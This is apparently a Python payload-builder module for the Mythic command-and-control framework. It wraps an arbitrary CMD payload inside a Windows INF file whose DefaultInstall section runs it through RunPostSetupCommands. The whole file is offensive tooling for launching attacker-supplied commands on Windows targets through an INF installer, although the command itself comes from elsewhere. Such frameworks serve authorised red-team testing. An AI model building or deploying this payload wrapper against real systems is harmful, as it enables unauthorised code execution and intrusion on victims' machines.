import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class inf_wraps_cmd(PayloadType):
    name = "inf_wraps_cmd"
    file_extension = "inf"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["cmd_*"]
    note = """Creates a INF payload which will wraps a CMD payload"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "file"
    agent_icon_path = agent_path / "agent_functions" / "file.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            cmd_payload = self.wrapped_payload.decode()
         
            payload = """[version]
Signature="$Windows NT$"

[DefaultInstall]
RunPostSetupCommands=setup

[setup]
{payload}
"""

            resp.payload = payload.format(payload=cmd_payload)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
